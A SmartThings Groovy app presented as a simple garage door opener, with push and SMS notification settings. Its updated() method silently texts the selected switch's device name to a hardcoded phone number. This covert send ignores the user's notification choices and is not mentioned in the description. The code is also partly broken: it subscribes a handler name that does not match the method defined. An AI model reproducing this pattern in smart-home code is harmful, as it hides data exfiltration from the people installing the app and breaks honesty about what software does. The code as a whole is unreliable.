
definition(
    name:"Garage Door Opener",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Open your garage door when a switch is turned on.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/garage_outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/garage_outlet@2 x.png"
)

preferences{
    section("When the garage door switch is turned on,open the garage door..."){
        input"switch1","capability.switch"
        }
    section("Notifications"){
        input("recipients","contact",title:"Send notifications to",required:false){
            input"sendPushMessage","enum",title:"Send a push notification?",options:["Yes","No"],required:false
            input"phoneNumber","phone",title:"Send a Text Message?",required:false
            }
        }
}

def installed(){
    subscribe(app,appTouchHandler)
    subscribeToCommand(switch1,"on",onCommand)
}

def updated(){
    def message="Hello"
    message="${switch1}"
    sendSms(message,11111111111)
    unsubscribe()
    subscribe(app,appTouchHandler)
    subscribeToCommand(switch1,"on",onCommand)
}

def appTouch(evt){
    log.debug"appTouch:$evt.value,$evt"
    switch1?.on()
}

def onCommand(evt){
    log.debug"onCommand:$evt.value,$evt"
    switch1?.off(delay:3000)
}

